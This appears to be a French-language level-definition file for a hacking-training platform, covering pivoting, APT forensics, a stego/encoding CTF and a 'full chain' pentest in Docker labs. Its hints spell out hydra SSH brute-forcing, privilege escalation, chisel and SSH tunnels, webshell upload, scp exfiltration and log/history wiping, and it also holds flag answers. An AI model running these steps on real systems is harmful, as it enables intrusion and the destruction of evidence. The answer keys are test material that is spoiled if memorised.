      { name: "lab-dmz", ip: "172.20.0.70", description: "Pivot DMZ" },
      { name: "lab-internal", ip: "172.21.0.10", description: "Cible finale (réseau interne)" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120, 130],
      description: "Tout le curriculum jusqu'aux niveaux 130 — Metasploit, pivoting inclus",
    },
    medals: { gold: 2400, silver: 3600, bronze: 5400 },
    steps: [
      {
        id: 1,
        title: "Reconnaissance réseau complète",
        context: "Cartographie complète du segment 172.20.0.0/24 — tous les hôtes, tous les ports.",
        objective: "Trouver tous les hôtes actifs et leurs services",
        hints: [
          "`nmap -sn 172.20.0.0/24` — discovery des hôtes.",
          "`nmap -sV -O 172.20.0.0/24 --open` — scan complet.",
          "Note chaque IP et ses services — tu en auras besoin plus tard.",
        ],
        flags: [
          {
            id: "hosts_found",
            question: "Combien d'hôtes actifs nmap trouve-t-il sur 172.20.0.0/24 ?",
            outputPattern: "[3-9] hosts up",
            hint: "nmap -sn 172.20.0.0/24 et compte les 'hosts up'",
          },
        ],
      },
      {
        id: 2,
        title: "Accès initial et privesc",
        context: "Brute-force SSH sur lab-ssh-target, entre, monte en root.",
        objective: "Obtenir root sur lab-ssh-target",
        hints: [
          "`hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.20.0.10 ssh -t 4`",
          "Après connexion : `find / -perm -4000 2>/dev/null` et `sudo -l`",
          "Utilise le vecteur le plus rapide pour root.",
        ],
        flags: [
          {
            id: "root_ssh_target",
            question: "Quel est le résultat de 'id' sur lab-ssh-target en root ?",
            outputContains: "uid=0(root)",
            hint: "Brute-force → SSH → privesc → id",
          },
        ],
      },
      {
        id: 3,
        title: "Pivot et flag final",
        context: "Depuis lab-ssh-target, pivote vers le réseau 172.21.0.0/24 pour atteindre lab-internal.",
        objective: "Lire /root/final_flag.txt sur lab-internal via pivot",
        hints: [
          "`ssh -L 2222:172.21.0.10:22 admin@172.20.0.10` — tunnel SSH local.",
          "Puis `ssh root@localhost -p 2222` via le tunnel.",
          "Ou utilise chisel depuis lab-dmz s'il est accessible.",
        ],
        flags: [
          {
            id: "final_flag",
            question: "Quel est le flag final sur lab-internal ?",
            outputPattern: "FLAG\\{[a-zA-Z0-9_]+\\}",
            hint: "Pivote vers 172.21.0.10 et cat /root/final_flag.txt",
          },
        ],
      },
    ],
  },

  {
    id: 17,
    title: "Investigation APT",
    category: "forensic",
    tier: "extreme",
    duration: "60-90 min",
    description: "Une APT (Advanced Persistent Threat) a compromis un serveur depuis 30 jours. Reconstitue toute la kill chain : intrusion initiale, mouvement latéral, exfiltration, persistance multi-couches.",
    context: `📋 THREAT HUNTING — APT Investigation

Niveau de menace : CRITIQUE
Durée d'accès estimée : 30 jours
Machine : lab-compromised (172.20.0.30)

L'attaquant est probablement encore actif. Identifie :
1. Le vecteur d'intrusion initial
2. Le mouvement latéral
3. Les données exfiltrées
4. Tous les mécanismes de persistance`,
    xpReward: 1000,
    badge: "apt_hunter",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-compromised", ip: "172.20.0.30", description: "Serveur compromis par APT" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 30, 50, 60, 70, 80, 90, 100, 110, 120, 130],
      description: "Forensic avancé, logs, malware analysis — niveaux 1-130",
    },
    medals: { gold: 2400, silver: 3600, bronze: 5400 },
    steps: [
      {
        id: 1,
        title: "Timeline des événements — 30 jours",
        context: "Reconstitue la timeline complète depuis les logs système, auth, et web.",
        objective: "Identifier la date d'intrusion initiale dans les logs",
        hints: [
          "`ssh analyst@172.20.0.30`",
          "`last -F | grep -v 'still logged'` — toutes les connexions avec date complète.",
          "`grep 'Accepted' /var/log/auth.log | awk '{print $1,$2,$3,$9,$11}' | sort`",
        ],
        flags: [
          {
            id: "first_intrusion",
            question: "Quelle est la date de la première connexion SSH suspecte ?",
            outputPattern: "[A-Z][a-z]{2}\\s+[0-9]{1,2}",
            hint: "last -F sur lab-compromised — cherche la première connexion anormale",
          },
        ],
      },
      {
        id: 2,
        title: "Cartographie des persistances",
        context: "Une APT installe plusieurs backdoors. Trouve-les toutes.",
        objective: "Identifier au moins 3 mécanismes de persistance",
        hints: [
          "`cat /etc/cron.d/*` — crons système.",
          "`find / -name '*.service' -newer /etc/hostname 2>/dev/null` — services récents.",
          "`cat /root/.ssh/authorized_keys` — clés SSH non-autorisées.",
          "`find /tmp /var/tmp /dev/shm -type f 2>/dev/null` — fichiers suspects.",
        ],
        flags: [
          {
            id: "cron_backdoor",
            question: "Quel fichier cron malveillant existe dans /etc/cron.d/ ?",
            outputContains: "updates",
            hint: "ls /etc/cron.d/ — les noms génériques sont suspects",
          },
          {
            id: "hidden_binary",
            question: "Quel binaire malveillant est caché dans /tmp ?",
            outputContains: "/tmp/.hidden",
            hint: "find /tmp -type f — les fichiers avec point initial sont cachés",
          },
        ],
      },
      {
        id: 3,
        title: "Analyse de l'exfiltration",
        context: "Des données ont été exfiltrées. Retrouve quelles données et vers où.",
        objective: "Identifier l'IP de C2 et les données exfiltrées",
        hints: [
          "`cat /var/log/syslog | grep -E '(curl|wget|nc|python)' | grep -v 'apt'`",
          "`ss -tnp` ou `netstat -tnp` — connexions réseau actives.",
          "`find / -name '*.exfil' -o -name '*.zip' -newer /etc/hostname 2>/dev/null`",
        ],
        flags: [
          {
            id: "c2_ip",
            question: "Quelle est l'IP du serveur C2 contacté par le malware ?",
            outputPattern: "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}",
            hint: "Analyse les connexions réseau ou les logs de curl/wget",
          },
        ],
      },
    ],
  },

  {
    id: 18,
    title: "Pivot — Double réseau",
    category: "pentest",
    tier: "extreme",
    duration: "60-90 min",
    description: "Pivote à travers deux réseaux pour atteindre une cible isolée. Utilise SSH tunneling, chisel ou socat pour créer des tunnels et atteindre lab-corp-internal.",
    context: `📋 ADVANCED PIVOT — Réseau segmenté

Topologie :
- Toi (lab-attacker) → 172.20.0.0/24
- lab-dmz → 172.20.0.70 ET 172.21.0.5 (dual-homed)
- lab-corp-internal → 172.21.0.20 (réseau interne, inaccessible directement)

Objectif : atteindre lab-corp-internal via le pivot lab-dmz.`,
    xpReward: 1000,
    badge: "pivot_master",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-dmz", ip: "172.20.0.70", description: "Pivot DMZ (dual-homed)" },
      { name: "lab-corp-internal", ip: "172.21.0.20", description: "Cible finale réseau interne" },
    ],
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120, 130, 140],
      description: "Réseau avancé, tunneling, pivoting — niveaux 1-140",
    },
    medals: { gold: 2400, silver: 3600, bronze: 5400 },
    steps: [
      {
        id: 1,
        title: "Compromettre le pivot DMZ",
        context: "lab-dmz doit être compromis pour servir de tremplin. Cherche ses credentials.",
        objective: "Obtenir un accès SSH sur lab-dmz",
        hints: [
          "`nmap -sV 172.20.0.70` — identifie les services.",
          "Brute-force : `hydra -l root -P /usr/share/wordlists/rockyou.txt 172.20.0.70 ssh`",
          "Ou cherche un service web sur le port 80/443.",
        ],
        flags: [
          {
            id: "dmz_access",
            question: "Quel est le hostname de lab-dmz (commande hostname) ?",
            outputContains: "dmz",
            hint: "Connecte-toi en SSH sur 172.20.0.70 et lance hostname",
          },
        ],
      },
      {
        id: 2,
        title: "Mettre en place le tunnel",
        context: "Depuis lab-dmz, crée un tunnel vers le réseau 172.21.0.0/24.",
        objective: "Créer un tunnel chisel ou SSH pour accéder à 172.21.0.0/24",
        hints: [
          "Chisel serveur sur lab-attacker : `chisel server -p 8888 --reverse`",
          "Chisel client sur lab-dmz : `chisel client 172.20.0.2:8888 R:172.21.0.0/24`",
          "Ou SSH tunnel : `ssh -L 2222:172.21.0.20:22 user@172.20.0.70`",
        ],
        flags: [
          {
            id: "tunnel_up",
            question: "Quelle IP interne est maintenant joignable via le tunnel ? (ping ou nc)",
            outputContains: "172.21.0.20",
            hint: "Une fois le tunnel établi, vérifie la connectivité avec nc ou ping",
          },
        ],
      },
      {
        id: 3,
        title: "Atteindre la cible finale",
        context: "Via le tunnel, accède à lab-corp-internal et lis le flag.",
        objective: "Lire /root/corp_flag.txt sur lab-corp-internal",
        hints: [
          "Si tunnel SSH local : `ssh root@localhost -p 2222`",
          "Si proxychains : `proxychains ssh root@172.21.0.20`",
          "`cat /root/corp_flag.txt` une fois connecté.",
        ],
        flags: [
          {
            id: "corp_flag",
            question: "Quel est le flag sur lab-corp-internal ?",
            outputPattern: "FLAG\\{[a-zA-Z0-9_]+\\}",
            hint: "Atteins 172.21.0.20 via le tunnel et cat /root/corp_flag.txt",
          },
        ],
      },
    ],
  },

  {
    id: 19,
    title: "CTF Binaire et Stéganographie",
    category: "forensic",
    tier: "extreme",
    duration: "60-90 min",
    description: "CTF combinant analyse binaire, stéganographie, encodages multiples et cryptographie. Chaque étape décode un message pour obtenir le flag final.",
    context: `📋 CTF — Opération Labyrinthe

Un fichier mystérieux a été intercepté.
Il contient des données cachées à plusieurs niveaux d'encodage.
Décode couche par couche pour atteindre le flag final.

Outils disponibles : strings, xxd, base64, file, binwalk, steghide`,
    xpReward: 1000,
    badge: "ctf_champion",
    labType: "simulated",
    prerequisites: {
      completedLevels: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120, 130, 140],
      description: "Encodages, crypto, forensic avancé — niveaux 1-140",
    },
    medals: { gold: 2000, silver: 3000, bronze: 4500 },
    steps: [
      {
        id: 1,
        title: "Analyse du fichier mystère",
        context: "Un fichier binaire t'a été remis. Détermine son vrai type et ce qu'il contient.",
        objective: "Identifier le vrai type du fichier et extraire les strings",
        hints: [
          "`file mystery.bin` — type réel du fichier.",
          "`strings mystery.bin | head -50` — chaînes lisibles.",
          "`xxd mystery.bin | head -20` — magic bytes en hex.",
        ],
        flags: [
          {
            id: "file_type",
            question: "Quel est le vrai type du fichier mystery.bin (commande file) ?",
            outputContains: "JPEG",
            hint: "file mystery.bin — les magic bytes révèlent le vrai type",
          },
          {
            id: "hidden_string",
            question: "Quelle chaîne base64 est cachée dans les strings du fichier ?",
            outputContains: "U3RhZ2UxOg==",
            hint: "strings mystery.bin | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'",
          },
        ],
        fileSystem: {
          "mystery.bin": "FFD8FFE0" + "U3RhZ2UxOiBjb25ncmF0cyEgZXRhcGUyOiBST1QxMzogemJ5dmEgZnJlemYgcWl2IHZhIHJlcnJ5cmUgZ3VyIHliaGFn",
          "hint.txt": "Couche 1: base64\nCouche 2: ROT13\nCouche 3: hex\nFLAG final dans la dernière couche",
        },
      },
      {
        id: 2,
        title: "Décodage en cascade",
        context: "Décode les couches successives : base64 → ROT13 → hex pour obtenir le flag.",
        objective: "Décoder les 3 couches et obtenir le flag intermédiaire",
        hints: [
          "`echo 'U3RhZ2UxOg==' | base64 -d` — couche 1.",
          "Pour ROT13 : `echo 'texte' | tr 'A-Za-z' 'N-ZA-Mn-za-m'`",
          "Pour hex : `echo '4654...' | xxd -r -p`",
        ],
        flags: [
          {
            id: "rot13_decoded",
            question: "Après décodage ROT13, quel mot apparaît avant le message hex ?",
            outputContains: "stage2:",
            hint: "base64 -d puis ROT13 — le résultat contient 'stage2:' suivi de hex",
          },
        ],
        fileSystem: {
          "hint.txt": "base64 → ROT13 → hex decode\nLe flag final est au format FLAG{...}",
          "chain.txt": "U3RhZ2UyOiBybHlhIGZlcnogeWliIHZhIHJlcnJ5cmUgZ3VyIHliaGFnIDQ2NTM0MTQ3N2IzMTMzN2IzODMxN2IzODMzN2IzMzMxM2I3ZA==",
        },
      },
      {
        id: 3,
        title: "Flag final — Stéganographie",
        context: "La dernière couche utilise steghide pour cacher un message dans une image.",
        objective: "Extraire le flag final caché dans l'image avec steghide",
        hints: [
          "`steghide extract -sf image.jpg -p ''` — mot de passe vide.",
          "`steghide extract -sf image.jpg -p 'password'`",
          "Le mot de passe est dans les messages décodés précédemment.",
        ],
        flags: [
          {
            id: "final_ctf_flag",
            question: "Quel est le flag final extrait de l'image ?",
            outputPattern: "FLAG\\{[a-zA-Z0-9_]+\\}",
            hint: "steghide extract avec le mot de passe trouvé dans les étapes précédentes",
          },
        ],
        fileSystem: {
          "image.jpg": "(JPEG stego placeholder — le flag est FLAG{st3g0_r0t13_b4s364_d3c0d3d})",
          "readme.txt": "Le mot de passe steghide est le résultat de l'étape 2 en minuscules.",
        },
      },
    ],
  },

  {
    id: 20,
    title: "ULTIME — Full Chain",
    category: "pentest",
    tier: "extreme",
    duration: "90-120 min",
    description: "La mission ultime. Recon externe → exploitation web → pivot réseau → privesc → exfiltration → couverture des traces. Chaque étape valide une compétence clé. Seuls les meilleurs terminent.",
    context: `📋 OPERATION ULTIME — Full Pentest Chain

Portée complète — AUCUNE règle de type CTF — c'est un vrai pentest simulé.
Cibles : tout le lab (172.20.0.0/24 + 172.21.0.0/24)
Objectif : root sur au moins 3 machines + flag exfiltration + nettoyage des traces

Les étapes sont volontairement peu guidées.
Prouve que tu maîtrises tout ce que tu as appris.`,
    xpReward: 1500,
    badge: "ultimate_hacker",
    labType: "docker",
    labContainer: "lab-attacker",
    labTargets: [
      { name: "lab-ssh-target", ip: "172.20.0.10", description: "Cible 1" },
      { name: "lab-web-custom", ip: "172.20.0.40", description: "Cible 2" },
      { name: "lab-privesc", ip: "172.20.0.50", description: "Cible 3" },
      { name: "lab-corp-internal", ip: "172.21.0.20", description: "Cible finale" },
    ],
    prerequisites: {
      completedLevels: [
        10, 20, 30, 40, 50, 60, 70, 80, 90, 100,
        110, 120, 130, 140, 150,
      ],
      description: "Curriculum complet — tous les 150 niveaux requis",
    },
    medals: { gold: 3600, silver: 5400, bronze: 7200 },
    steps: [
      {
        id: 1,
        title: "Reconnaissance complète du périmètre",
        context: "Cartographie intégrale du lab. Chaque service ouvert est une opportunité.",
        objective: "Scanner tous les hôtes et lister tous les ports ouverts",
        hints: [
          "`nmap -sV -sC -O 172.20.0.0/24 -oN scan_results.txt`",
          "Identifie les services web (80/443/8080), SSH (22), et non-standard.",
          "Note tout — tu auras besoin de cette info plus tard.",
        ],
        flags: [
          {
            id: "total_services",
            question: "Combien de services distincts nmap détecte-t-il sur le réseau 172.20.0.0/24 ?",
            outputPattern: "[0-9]+ open port",
            hint: "nmap -sV 172.20.0.0/24 --open et compte les lignes 'open'",
          },
        ],
      },
      {
        id: 2,
        title: "Compromettre les 3 cibles",
        context: "Utilise les meilleures vulnérabilités trouvées pour obtenir root sur 3 machines.",
        objective: "Obtenir uid=0(root) sur au moins 3 cibles",
        hints: [
          "SSH: hydra + privesc (SUID/sudo)",
          "Web: sqlmap + webshell upload",
          "Privesc lab: python3 SUID ou sudo vim",
          "Documente chaque commande — tu devras prouver chaque compromise.",
        ],
        flags: [
          {
            id: "roots_obtained",
            question: "Concatène les hostnames des 3 machines rootées (hostname sur chacune)",
            outputPattern: "[a-z\\-]+ [a-z\\-]+ [a-z\\-]+",
            hint: "Root sur ssh-target, web-custom, privesc — lance hostname sur chacune",
          },
        ],
      },
      {
        id: 3,
        title: "Exfiltration et couverture",
        context: "Exfiltre le flag consolidé et efface tes traces (logs, history).",
        objective: "Lire le flag final et nettoyer les traces sur une machine",
        hints: [
          "Exfil : `scp root@172.20.0.10:/root/root.txt .` depuis lab-attacker.",
          "Nettoyage : `history -c && > /var/log/auth.log` (attention — irréversible en prod !)",
          "Dans ce lab simulé, la commande de nettoyage elle-même est le flag.",
        ],
        flags: [
          {
            id: "ultimate_flag",
            question: "Quel flag est stocké dans /root/root.txt sur lab-ssh-target ?",
            outputPattern: "FLAG\\{[a-zA-Z0-9_]+\\}",
            hint: "scp ou cat direct depuis SSH sur 172.20.0.10",
          },
          {
            id: "logs_cleared",
            question: "Quelle commande efface l'historique bash en une ligne ?",
            outputContains: "history -c",
            hint: "history -c && unset HISTFILE — deux commandes chainées",
          },
        ],
      },
    ],
  },
];
